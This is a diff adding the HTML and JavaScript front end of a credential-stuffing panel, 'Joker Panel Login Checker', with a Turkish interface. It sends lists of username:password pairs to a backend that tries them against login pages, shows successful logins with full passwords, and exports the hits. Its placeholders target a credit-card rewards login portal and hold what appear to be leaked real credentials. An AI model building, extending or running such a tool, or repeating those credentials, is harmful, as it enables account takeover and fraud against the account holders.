@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Joker - Panel Login Checker</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: system-ui; margin: 20px; background: #f0f2f5; }
+        .container { max-width: 1500px; margin: auto; }
+        .card { background: white; padding: 20px; border-radius: 16px; margin-bottom: 20px; }
+        .flex { display: flex; gap: 20px; flex-wrap: wrap; }
+        .col { flex: 1; min-width: 250px; }
+        textarea { width: 100%; font-family: monospace; padding: 12px; border-radius: 12px; border: 1px solid #ccc; font-size: 14px; }
+        button { background: #1e466e; color: white; border: none; padding: 8px 18px; border-radius: 30px; cursor: pointer; margin-right: 10px; }
+        button:hover { background: #0f2c46; }
+        .split { display: flex; gap: 24px; margin-top: 20px; flex-wrap: wrap; }
+        .table-panel { flex: 2; }
+        .logs-panel { flex: 1; background: #1e1e2f; border-radius: 16px; padding: 12px; color: #cfd7ff; height: 550px; overflow-y: auto; display: flex; flex-direction: column-reverse; font-family: monospace; font-size: 13px; }
+        .log-info { color: #aad0ff; }
+        .log-success { color: #a3e4a3; background: #2a5a2a40; }
+        .log-fail { color: #ffb3b3; background: #8b3a3a40; }
+        .log-error { color: #ff8888; background: #8b3a3a60; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #2c3e66; color: white; }
+        .ok { background: #d4edda; }
+        .fail { background: #f8d7da; }
+        .table-wrapper { max-height: 500px; overflow-y: auto; }
+        .note { font-size: 12px; color: #666; margin-top: 8px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <h2>🔐 Joker Panel Checker </h2>
+        <div class="flex">
+            <div class="col">
+                <label><b>🌐 Base URL listesi (opsiyonel)</b></label>
+                <textarea id="baseUrls" rows="4" placeholder="https://login.fidelityrewards.com/onlineCard/login.do&#10;https://fidelityrewards.com/login"></textarea>
+            </div>
+            <div class="col">
+                <label><b>🔑 Kullanıcı:Şifre listesi</b><br>
+                <small>Format: url:user:pass veya user:pass</small></label>
+                <textarea id="creds" rows="8" placeholder="https://fidelityrewards.com:barraganjudie@aetna.com:zdjoi973J0ERz&#10;95009:s4978600tf&#10;sugarplum81:Cos10pews_2010"></textarea>
+            </div>
+        </div>
+        <div style="margin-top: 15px;">
+            <button onclick="startTest()">▶ BAŞLAT</button>
+            <button onclick="clearAll()">🧹 TEMİZLE</button>
+            <button onclick="downloadResults()">📥 İNDİR</button>
+        </div>
+        <div class="note">💡 Her tuş vuruşu yavaşlatıldı (150ms) – giriş bilgilerini net göreceksiniz. Testler arası 2 saniye bekler. Sayfa yenilense bile temiz başlar.</div>
+    </div>
+
+    <div class="split">
+        <div class="table-panel">
+            <h3>📊 Sonuçlar (Şifreler Tam Görünür)</h3>
+            <div class="table-wrapper">
+                <table id="resultTable">
+                    <thead><tr><th>URL</th><th>Kullanıcı</th><th>Şifre</th><th>Durum</th></tr></thead>
+                    <tbody id="tableBody"></tbody>
+                </table>
+            </div>
+        </div>
+        <div class="logs-panel" id="logPanel"><div>⏳ Bekleniyor...</div></div>
+    </div>
+</div>
+
+<script>
+    const tbody = document.getElementById('tableBody');
+    const logPanel = document.getElementById('logPanel');
+    let eventSource = null;
+    let refreshTimer = null;
+    let totalTests = 0;
+
+    function connectLogStream() {
+        if (eventSource) eventSource.close();
+        eventSource = new EventSource('/api/log-stream');
+        eventSource.onmessage = (e) => {
+            const log = JSON.parse(e.data);
+            const div = document.createElement('div');
+            div.className = `log-${log.type}`;
+            div.innerHTML = `[${log.timestamp.slice(11,19)}] ${log.message}`;
+            logPanel.prepend(div);
+        };
+        eventSource.onerror = () => console.warn("SSE bağlantı hatası");
+    }
+
+    async function refreshResults() {
+        const res = await fetch('/api/results');
+        const data = await res.json();
+        tbody.innerHTML = '';
+        data.forEach(r => {
+            const row = `<tr class="${r.success ? 'ok' : 'fail'}">
+                <td>${escapeHtml(r.baseUrl)}</td>
+                <td>${escapeHtml(r.username)}</td>
+                <td>${escapeHtml(r.password)}</td>
+                <td>${r.success ? '✅ BAŞARILI' : '❌ BAŞARISIZ'}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+        });
+
+        if (totalTests > 0 && data.length === totalTests && !window.popupShown) {
+            window.popupShown = true;
+            const okCount = data.filter(x => x.success).length;
+            alert(`🏁 TEST TAMAMLANDI!\n✅ Başarılı: ${okCount}\n❌ Başarısız: ${data.length - okCount}\nRaporu "İNDİR" butonuyla alabilirsiniz.`);
+            if (refreshTimer) clearInterval(refreshTimer);
+            refreshTimer = null;
+        }
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m]));
+    }
+
+    async function clearAll() {
+        tbody.innerHTML = '';
+        logPanel.innerHTML = '<div>🧹 Temizlendi - Yeni teste hazır</div>';
+        await fetch('/api/results', { method: 'DELETE' });
+        if (refreshTimer) {
+            clearInterval(refreshTimer);
+            refreshTimer = null;
+        }
+        totalTests = 0;
+        window.popupShown = false;
+    }
+
+    async function startTest() {
+        const baseUrls = document.getElementById('baseUrls').value;
+        const creds = document.getElementById('creds').value;
+        if (!creds.trim()) {
+            alert('Lütfen Kullanıcı:Şifre listesini doldurun.');
+            return;
+        }
+
+        await clearAll();
+
+        const res = await fetch('/api/start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ baseUrlsText: baseUrls, credsText: creds })
+        });
+        if (!res.ok) {
+            const err = await res.json();
+            alert('Hata: ' + (err.error || 'Bilinmeyen hata'));
+            return;
+        }
+        const json = await res.json();
+        totalTests = json.total;
+        window.popupShown = false;
+        alert(`Test başladı! Toplam ${totalTests} kombinasyon. Yazılan karakterleri net göreceksiniz.`);
+
+        if (refreshTimer) clearInterval(refreshTimer);
+        refreshTimer = setInterval(refreshResults, 1500);
+        refreshResults();
+    }
+
+    async function downloadResults() {
+        window.location.href = '/api/download';
+    }
+
+    window.onload = async () => {
+        await clearAll();
+        connectLogStream();
+        refreshResults();
+    };
+</script>
+</body>
+</html>
